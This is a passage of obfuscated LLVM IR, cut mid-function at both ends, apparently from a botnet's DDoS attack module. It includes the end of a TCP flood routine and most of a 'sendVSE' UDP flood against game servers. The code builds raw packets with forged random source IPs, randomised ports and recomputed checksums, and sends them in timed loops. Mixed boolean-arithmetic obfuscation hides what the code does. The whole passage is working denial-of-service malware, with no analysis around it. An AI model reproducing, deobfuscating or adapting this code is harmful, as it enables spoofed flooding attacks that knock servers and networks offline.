  %112 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %113 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %112, i32 0, i32 0
  %114 = bitcast %union.anon.0* %113 to %struct.anon.1*
  %115 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %114, i32 0, i32 3
  store i32 %111, i32* %115, align 4
  %116 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %117 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %116, i32 0, i32 0
  %118 = bitcast %union.anon.0* %117 to %struct.anon.1*
  %119 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %118, i32 0, i32 4
  %120 = load i16, i16* %119, align 4
  %121 = xor i16 %120, -1
  %122 = xor i16 16383, -1
  %123 = xor i16 -30154, -1
  %124 = or i16 %121, %122
  %125 = or i16 -30154, %123
  %126 = xor i16 %124, -1
  %127 = and i16 %126, %125
  %128 = and i16 %120, 16383
  store i16 %127, i16* %119, align 4
  %129 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon.0* %130 to %struct.anon.1*
  %132 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %131, i32 0, i32 4
  %133 = load i16, i16* %132, align 4
  %134 = xor i16 -241, -1
  %135 = xor i16 %133, %134
  %136 = and i16 %135, %133
  %137 = and i16 %133, -241
  %138 = and i16 %136, 80
  %139 = xor i16 %136, 80
  %140 = or i16 %138, %139
  %141 = or i16 %136, 80
  store i16 %140, i16* %132, align 4
  %142 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %142, i32 0, i32 0
  %144 = bitcast %union.anon.0* %143 to %struct.anon.1*
  %145 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %144, i32 0, i32 4
  %146 = load i16, i16* %145, align 4
  %147 = xor i16 -513, -1
  %148 = xor i16 %146, %147
  %149 = and i16 %148, %146
  %150 = and i16 %146, -513
  %151 = and i16 %149, 512
  %152 = xor i16 %149, 512
  %153 = or i16 %151, %152
  %154 = or i16 %149, 512
  store i16 %153, i16* %145, align 4
  %155 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %156 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %155, i32 0, i32 0
  %157 = bitcast %union.anon.0* %156 to %struct.anon.1*
  %158 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %157, i32 0, i32 4
  %159 = load i16, i16* %158, align 4
  %160 = xor i16 -4097, -1
  %161 = xor i16 %159, %160
  %162 = and i16 %161, %159
  %163 = and i16 %159, -4097
  %164 = xor i16 %162, -1
  %165 = xor i16 4096, -1
  %166 = xor i16 9908, -1
  %167 = and i16 %164, 9908
  %168 = and i16 %162, %166
  %169 = and i16 %165, 9908
  %170 = and i16 4096, %166
  %171 = or i16 %167, %168
  %172 = or i16 %169, %170
  %173 = xor i16 %171, %172
  %174 = or i16 %164, %165
  %175 = xor i16 %174, -1
  %176 = or i16 9908, %166
  %177 = and i16 %175, %176
  %178 = or i16 %173, %177
  %179 = or i16 %162, 4096
  store i16 %178, i16* %158, align 4
  %180 = call i32 @rand_cmwc()
  %181 = trunc i32 %180 to i16
  %182 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %182, i32 0, i32 0
  %184 = bitcast %union.anon.0* %183 to %struct.anon.1*
  %185 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %184, i32 0, i32 5
  store i16 %181, i16* %185, align 2
  %186 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 0
  %188 = bitcast %union.anon.0* %187 to %struct.anon.1*
  %189 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %188, i32 0, i32 6
  store i16 0, i16* %189, align 4
  %190 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon.0* %191 to %struct.anon.1*
  %193 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %192, i32 0, i32 7
  store i16 0, i16* %193, align 2
  %194 = load i32, i32* %8, align 4
  %195 = icmp eq i32 %194, 0
  br i1 %195, label %196, label %198

; <label>:196:                                    ; preds = %74
  %197 = call i32 @rand_cmwc()
  br label %203

; <label>:198:                                    ; preds = %74
  %199 = load i32, i32* %8, align 4
  %200 = trunc i32 %199 to i16
  %201 = call zeroext i16 @htons(i16 zeroext %200) #13
  %202 = zext i16 %201 to i32
  br label %203

; <label>:203:                                    ; preds = %198, %196
  %204 = phi i32 [ %197, %196 ], [ %202, %198 ]
  %205 = trunc i32 %204 to i16
  %206 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 0
  %208 = bitcast %union.anon.0* %207 to %struct.anon.1*
  %209 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %208, i32 0, i32 1
  store i16 %205, i16* %209, align 2
  %210 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %211 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %212 = call zeroext i16 @tcpcsum(%struct.iphdr* %210, %struct.tcphdr* %211)
  %213 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon.0* %214 to %struct.anon.1*
  %216 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %215, i32 0, i32 6
  store i16 %212, i16* %216, align 4
  %217 = bitcast i8* %81 to i16*
  %218 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 2
  %220 = load i16, i16* %219, align 2
  %221 = zext i16 %220 to i32
  %222 = call zeroext i16 @csum(i16* %217, i32 %221)
  %223 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 7
  store i16 %222, i16* %224, align 2
  %225 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %226 = load i32, i32* %9, align 4
  %227 = sub i32 0, %226
  %228 = sub i32 %225, %227
  %229 = add nsw i32 %225, %226
  store i32 %228, i32* %21, align 4
  store i32 0, i32* %22, align 4
  br label %230

; <label>:230:                                    ; preds = %283, %282, %203
  br label %231

; <label>:231:                                    ; preds = %230
  %232 = load i32, i32* %15, align 4
  %233 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %234 = call i64 @sendto(i32 %232, i8* %81, i64 %78, i32 0, %struct.sockaddr* %233, i32 16)
  %235 = load i32, i32* %17, align 4
  %236 = call i32 @GetRandomIP(i32 %235)
  %237 = call i32 @htonl(i32 %236) #13
  %238 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %238, i32 0, i32 8
  store i32 %237, i32* %239, align 4
  %240 = call i32 @rand_cmwc()
  %241 = trunc i32 %240 to i16
  %242 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 3
  store i16 %241, i16* %243, align 4
  %244 = call i32 @rand_cmwc()
  %245 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 0
  %247 = bitcast %union.anon.0* %246 to %struct.anon.1*
  %248 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %247, i32 0, i32 2
  store i32 %244, i32* %248, align 4
  %249 = call i32 @rand_cmwc()
  %250 = trunc i32 %249 to i16
  %251 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon.0* %252 to %struct.anon.1*
  %254 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %253, i32 0, i32 0
  store i16 %250, i16* %254, align 4
  %255 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 0
  %257 = bitcast %union.anon.0* %256 to %struct.anon.1*
  %258 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %257, i32 0, i32 6
  store i16 0, i16* %258, align 4
  %259 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %260 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %261 = call zeroext i16 @tcpcsum(%struct.iphdr* %259, %struct.tcphdr* %260)
  %262 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %263 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %262, i32 0, i32 0
  %264 = bitcast %union.anon.0* %263 to %struct.anon.1*
  %265 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %264, i32 0, i32 6
  store i16 %261, i16* %265, align 4
  %266 = bitcast i8* %81 to i16*
  %267 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 2
  %269 = load i16, i16* %268, align 2
  %270 = zext i16 %269 to i32
  %271 = call zeroext i16 @csum(i16* %266, i32 %270)
  %272 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 7
  store i16 %271, i16* %273, align 2
  %274 = load i32, i32* %22, align 4
  %275 = load i32, i32* %13, align 4
  %276 = icmp eq i32 %274, %275
  br i1 %276, label %277, label %283

; <label>:277:                                    ; preds = %231
  %278 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %279 = load i32, i32* %21, align 4
  %280 = icmp sgt i32 %278, %279
  br i1 %280, label %281, label %282

; <label>:281:                                    ; preds = %277
  br label %290

; <label>:282:                                    ; preds = %277
  store i32 0, i32* %22, align 4
  br label %230

; <label>:283:                                    ; preds = %231
  %284 = load i32, i32* %22, align 4
  %285 = sub i32 0, %284
  %286 = sub i32 0, 1
  %287 = add i32 %285, %286
  %288 = sub i32 0, %287
  %289 = add i32 %284, 1
  store i32 %288, i32* %22, align 4
  br label %230

; <label>:290:                                    ; preds = %281
  %291 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %291)
  br label %292

; <label>:292:                                    ; preds = %290, %54, %48, %41
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendVSE(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.sockaddr_in, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.udphdr*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i32 0, i32 0), i8** %17, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load i32, i32* %10, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %43

; <label>:39:                                     ; preds = %8
  %40 = call i32 @rand_cmwc()
  %41 = trunc i32 %40 to i16
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %41, i16* %42, align 2
  br label %48

; <label>:43:                                     ; preds = %8
  %44 = load i32, i32* %10, align 4
  %45 = trunc i32 %44 to i16
  %46 = call zeroext i16 @htons(i16 zeroext %45) #13
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  br label %48

; <label>:48:                                     ; preds = %43, %39
  %49 = load i8*, i8** %9, align 8
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 2
  %51 = call i32 @getHost(i8* %49, %struct.in_addr* %50)
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %48
  br label %373

; <label>:54:                                     ; preds = %48
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 3
  %56 = getelementptr inbounds [8 x i8], [8 x i8]* %55, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 8, i32 4, i1 false)
  %57 = load i32, i32* %14, align 4
  store i32 %57, i32* %20, align 4
  %58 = load i32, i32* %12, align 4
  %59 = icmp eq i32 %58, 32
  br i1 %59, label %60, label %133

; <label>:60:                                     ; preds = %54
  %61 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %61, i32* %21, align 4
  %62 = load i32, i32* %21, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %65, label %64

; <label>:64:                                     ; preds = %60
  br label %373

; <label>:65:                                     ; preds = %60
  %66 = load i32, i32* %13, align 4
  %67 = sub i32 0, 1
  %68 = sub i32 %66, %67
  %69 = add nsw i32 %66, 1
  %70 = sext i32 %68 to i64
  %71 = call noalias i8* @malloc(i64 %70) #2
  store i8* %71, i8** %22, align 8
  %72 = load i8*, i8** %22, align 8
  %73 = icmp eq i8* %72, null
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %65
  br label %373

; <label>:75:                                     ; preds = %65
  %76 = load i8*, i8** %22, align 8
  %77 = load i32, i32* %13, align 4
  %78 = sub i32 0, 1
  %79 = sub i32 %77, %78
  %80 = add nsw i32 %77, 1
  %81 = sext i32 %79 to i64
  call void @llvm.memset.p0i8.i64(i8* %76, i8 0, i64 %81, i32 1, i1 false)
  %82 = load i8*, i8** %22, align 8
  %83 = load i32, i32* %13, align 4
  call void @RandString(i8* %82, i32 %83)
  %84 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %85 = load i32, i32* %11, align 4
  %86 = sub i32 0, %85
  %87 = sub i32 %84, %86
  %88 = add nsw i32 %84, %85
  store i32 %87, i32* %23, align 4
  store i32 0, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %89

; <label>:89:                                     ; preds = %125, %121, %111, %75
  %90 = load i32, i32* %21, align 4
  %91 = load i8*, i8** %22, align 8
  %92 = load i32, i32* %13, align 4
  %93 = sext i32 %92 to i64
  %94 = bitcast %struct.sockaddr_in* %19 to %struct.sockaddr*
  %95 = call i64 @sendto(i32 %90, i8* %91, i64 %93, i32 0, %struct.sockaddr* %94, i32 16)
  %96 = load i32, i32* %24, align 4
  %97 = load i32, i32* %20, align 4
  %98 = icmp eq i32 %96, %97
  br i1 %98, label %99, label %112

; <label>:99:                                     ; preds = %89
  %100 = load i32, i32* %10, align 4
  %101 = icmp eq i32 %100, 0
  br i1 %101, label %102, label %106

; <label>:102:                                    ; preds = %99
  %103 = call i32 @rand_cmwc()
  %104 = trunc i32 %103 to i16
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  br label %106

; <label>:106:                                    ; preds = %102, %99
  %107 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %108 = load i32, i32* %23, align 4
  %109 = icmp sgt i32 %107, %108
  br i1 %109, label %110, label %111

; <label>:110:                                    ; preds = %106
  br label %132

; <label>:111:                                    ; preds = %106
  store i32 0, i32* %24, align 4
  br label %89

; <label>:112:                                    ; preds = %89
  %113 = load i32, i32* %24, align 4
  %114 = add i32 %113, 1126779643
  %115 = add i32 %114, 1
  %116 = sub i32 %115, 1126779643
  %117 = add i32 %113, 1
  store i32 %116, i32* %24, align 4
  %118 = load i32, i32* %25, align 4
  %119 = load i32, i32* %15, align 4
  %120 = icmp eq i32 %118, %119
  br i1 %120, label %121, label %125

; <label>:121:                                    ; preds = %112
  %122 = load i32, i32* %16, align 4
  %123 = mul nsw i32 %122, 1000
  %124 = call i32 @usleep(i32 %123)
  store i32 0, i32* %25, align 4
  br label %89

; <label>:125:                                    ; preds = %112
  %126 = load i32, i32* %25, align 4
  %127 = sub i32 0, %126
  %128 = sub i32 0, 1
  %129 = add i32 %127, %128
  %130 = sub i32 0, %129
  %131 = add i32 %126, 1
  store i32 %130, i32* %25, align 4
  br label %89

; <label>:132:                                    ; preds = %110
  br label %373

; <label>:133:                                    ; preds = %54
  %134 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %134, i32* %26, align 4
  %135 = load i32, i32* %26, align 4
  %136 = icmp ne i32 %135, 0
  br i1 %136, label %138, label %137

; <label>:137:                                    ; preds = %133
  br label %373

; <label>:138:                                    ; preds = %133
  store i32 1, i32* %27, align 4
  %139 = load i32, i32* %26, align 4
  %140 = bitcast i32* %27 to i8*
  %141 = call i32 @setsockopt(i32 %139, i32 0, i32 3, i8* %140, i32 4) #2
  %142 = icmp slt i32 %141, 0
  br i1 %142, label %143, label %144

; <label>:143:                                    ; preds = %138
  br label %373

; <label>:144:                                    ; preds = %138
  store i32 50, i32* %28, align 4
  br label %145

; <label>:145:                                    ; preds = %151, %144
  %146 = load i32, i32* %28, align 4
  %147 = sub i32 0, -1
  %148 = sub i32 %146, %147
  %149 = add nsw i32 %146, -1
  store i32 %148, i32* %28, align 4
  %150 = icmp ne i32 %146, 0
  br i1 %150, label %151, label %166

; <label>:151:                                    ; preds = %145
  %152 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %153 = call i32 @rand_cmwc()
  %154 = xor i32 %152, -1
  %155 = and i32 -482085176, %154
  %156 = xor i32 -482085176, -1
  %157 = and i32 %152, %156
  %158 = xor i32 %153, -1
  %159 = and i32 %158, -482085176
  %160 = and i32 %153, %156
  %161 = or i32 %155, %157
  %162 = or i32 %159, %160
  %163 = xor i32 %161, %162
  %164 = xor i32 %152, %153
  call void @srand(i32 %163) #2
  %165 = call i32 @rand() #2
  call void @init_rand(i32 %165)
  br label %145

; <label>:166:                                    ; preds = %145
  %167 = load i32, i32* %12, align 4
  %168 = icmp eq i32 %167, 0
  br i1 %168, label %169, label %170

; <label>:169:                                    ; preds = %166
  store i32 0, i32* %29, align 4
  br label %186

; <label>:170:                                    ; preds = %166
  %171 = load i32, i32* %12, align 4
  %172 = sub i32 0, %171
  %173 = add i32 32, %172
  %174 = sub nsw i32 32, %171
  %175 = shl i32 1, %173
  %176 = sub i32 %175, 500781832
  %177 = sub i32 %176, 1
  %178 = add i32 %177, 500781832
  %179 = sub nsw i32 %175, 1
  %180 = xor i32 %178, -1
  %181 = and i32 -1, %180
  %182 = xor i32 -1, -1
  %183 = and i32 %178, %182
  %184 = or i32 %181, %183
  %185 = xor i32 %178, -1
  store i32 %184, i32* %29, align 4
  br label %186

; <label>:186:                                    ; preds = %170, %169
  %187 = load i32, i32* %13, align 4
  %188 = sext i32 %187 to i64
  %189 = sub i64 0, %188
  %190 = sub i64 28, %189
  %191 = add i64 28, %188
  %192 = call i8* @llvm.stacksave()
  store i8* %192, i8** %30, align 8
  %193 = alloca i8, i64 %190, align 16
  %194 = bitcast i8* %193 to %struct.iphdr*
  store %struct.iphdr* %194, %struct.iphdr** %31, align 8
  %195 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %196 = bitcast %struct.iphdr* %195 to i8*
  %197 = getelementptr i8, i8* %196, i64 20
  %198 = bitcast i8* %197 to %struct.udphdr*
  store %struct.udphdr* %198, %struct.udphdr** %32, align 8
  %199 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 2
  %201 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %200, i32 0, i32 0
  %202 = load i32, i32* %201, align 4
  %203 = load i32, i32* %29, align 4
  %204 = call i32 @GetRandomIP(i32 %203)
  %205 = call i32 @htonl(i32 %204) #13
  %206 = load i32, i32* %13, align 4
  %207 = sext i32 %206 to i64
  %208 = sub i64 0, %207
  %209 = sub i64 8, %208
  %210 = add i64 8, %207
  %211 = trunc i64 %209 to i32
  call void @makeVSEPacket(%struct.iphdr* %199, i32 %202, i32 %205, i8 zeroext 17, i32 %211)
  %212 = load i32, i32* %13, align 4
  %213 = sext i32 %212 to i64
  %214 = sub i64 0, %213
  %215 = sub i64 8, %214
  %216 = add i64 8, %213
  %217 = load i32, i32* %18, align 4
  %218 = sext i32 %217 to i64
  %219 = add i64 %215, -846057925354614641
  %220 = add i64 %219, %218
  %221 = sub i64 %220, -846057925354614641
  %222 = add i64 %215, %218
  %223 = trunc i64 %221 to i16
  %224 = call zeroext i16 @htons(i16 zeroext %223) #13
  %225 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %226 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %225, i32 0, i32 0
  %227 = bitcast %union.anon.2* %226 to %struct.anon.3*
  %228 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %227, i32 0, i32 2
  store i16 %224, i16* %228, align 2
  %229 = call i32 @rand_cmwc()
  %230 = trunc i32 %229 to i16
  %231 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %232 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %231, i32 0, i32 0
  %233 = bitcast %union.anon.2* %232 to %struct.anon.3*
  %234 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %233, i32 0, i32 0
  store i16 %230, i16* %234, align 2
  %235 = load i32, i32* %10, align 4
  %236 = icmp eq i32 %235, 0
  br i1 %236, label %237, label %239

; <label>:237:                                    ; preds = %186
  %238 = call i32 @rand_cmwc()
  br label %244

; <label>:239:                                    ; preds = %186
  %240 = load i32, i32* %10, align 4
  %241 = trunc i32 %240 to i16
  %242 = call zeroext i16 @htons(i16 zeroext %241) #13
  %243 = zext i16 %242 to i32
  br label %244

; <label>:244:                                    ; preds = %239, %237
  %245 = phi i32 [ %238, %237 ], [ %243, %239 ]
  %246 = trunc i32 %245 to i16
  %247 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %248 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon.2* %248 to %struct.anon.3*
  %250 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %249, i32 0, i32 1
  store i16 %246, i16* %250, align 2
  %251 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon.2* %252 to %struct.anon.3*
  %254 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %253, i32 0, i32 3
  store i16 0, i16* %254, align 2
  %255 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %256 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %257 = bitcast %struct.udphdr* %256 to i8*
  %258 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 0
  %260 = bitcast %union.anon.2* %259 to %struct.anon.3*
  %261 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %260, i32 0, i32 2
  %262 = load i16, i16* %261, align 2
  %263 = load i32, i32* %18, align 4
  %264 = sext i32 %263 to i64
  %265 = sub i64 0, %264
  %266 = sub i64 12, %265
  %267 = add i64 12, %264
  %268 = trunc i64 %266 to i32
  %269 = call zeroext i16 @checksum_tcp_udp(%struct.iphdr* %255, i8* %257, i16 zeroext %262, i32 %268)
  %270 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %271 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %270, i32 0, i32 0
  %272 = bitcast %union.anon.2* %271 to %struct.anon.3*
  %273 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %272, i32 0, i32 3
  store i16 %269, i16* %273, align 2
  %274 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %275 = bitcast %struct.udphdr* %274 to i8*
  %276 = getelementptr inbounds i8, i8* %275, i64 8
  %277 = load i32, i32* %13, align 4
  call void @RandString(i8* %276, i32 %277)
  %278 = bitcast i8* %193 to i16*
  %279 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 2
  %281 = load i16, i16* %280, align 2
  %282 = zext i16 %281 to i32
  %283 = call zeroext i16 @csum(i16* %278, i32 %282)
  %284 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 7
  store i16 %283, i16* %285, align 2
  %286 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %287 = load i32, i32* %11, align 4
  %288 = sub i32 0, %286
  %289 = sub i32 0, %287
  %290 = add i32 %288, %289
  %291 = sub i32 0, %290
  %292 = add nsw i32 %286, %287
  store i32 %291, i32* %33, align 4
  store i32 0, i32* %34, align 4
  store i32 0, i32* %35, align 4
  br label %293

; <label>:293:                                    ; preds = %365, %361, %352, %244
  br label %294

; <label>:294:                                    ; preds = %293
  %295 = load i32, i32* %26, align 4
  %296 = load i32, i32* %18, align 4
  %297 = sext i32 %296 to i64
  %298 = add i64 32, -4521832256932094295
  %299 = add i64 %298, %297
  %300 = sub i64 %299, -4521832256932094295
  %301 = add i64 32, %297
  %302 = trunc i64 %190 to i32
  %303 = bitcast %struct.sockaddr_in* %19 to %struct.sockaddr*
  %304 = call i64 @sendto(i32 %295, i8* %193, i64 %300, i32 %302, %struct.sockaddr* %303, i32 16)
  %305 = call i32 @rand_cmwc()
  %306 = trunc i32 %305 to i16
  %307 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %308 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon.2* %308 to %struct.anon.3*
  %310 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %309, i32 0, i32 0
  store i16 %306, i16* %310, align 2
  %311 = load i32, i32* %10, align 4
  %312 = icmp eq i32 %311, 0
  br i1 %312, label %313, label %315

; <label>:313:                                    ; preds = %294
  %314 = call i32 @rand_cmwc()
  br label %320

; <label>:315:                                    ; preds = %294
  %316 = load i32, i32* %10, align 4
  %317 = trunc i32 %316 to i16
  %318 = call zeroext i16 @htons(i16 zeroext %317) #13
  %319 = zext i16 %318 to i32
  br label %320

; <label>:320:                                    ; preds = %315, %313
  %321 = phi i32 [ %314, %313 ], [ %319, %315 ]
  %322 = trunc i32 %321 to i16
  %323 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %324 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %323, i32 0, i32 0
  %325 = bitcast %union.anon.2* %324 to %struct.anon.3*
  %326 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %325, i32 0, i32 1
  store i16 %322, i16* %326, align 2
  %327 = call i32 @rand_cmwc()
  %328 = trunc i32 %327 to i16
  %329 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i32 0, i32 3
  store i16 %328, i16* %330, align 4
  %331 = load i32, i32* %29, align 4
  %332 = call i32 @GetRandomIP(i32 %331)
  %333 = call i32 @htonl(i32 %332) #13
  %334 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %335 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %334, i32 0, i32 8
  store i32 %333, i32* %335, align 4
  %336 = bitcast i8* %193 to i16*
  %337 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 2
  %339 = load i16, i16* %338, align 2
  %340 = zext i16 %339 to i32
  %341 = call zeroext i16 @csum(i16* %336, i32 %340)
  %342 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 7
  store i16 %341, i16* %343, align 2
  %344 = load i32, i32* %34, align 4
  %345 = load i32, i32* %20, align 4
  %346 = icmp eq i32 %344, %345
  br i1 %346, label %347, label %353

; <label>:347:                                    ; preds = %320
  %348 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %349 = load i32, i32* %33, align 4
  %350 = icmp sgt i32 %348, %349
  br i1 %350, label %351, label %352

; <label>:351:                                    ; preds = %347
  br label %371

; <label>:352:                                    ; preds = %347
  store i32 0, i32* %34, align 4
  br label %293

; <label>:353:                                    ; preds = %320
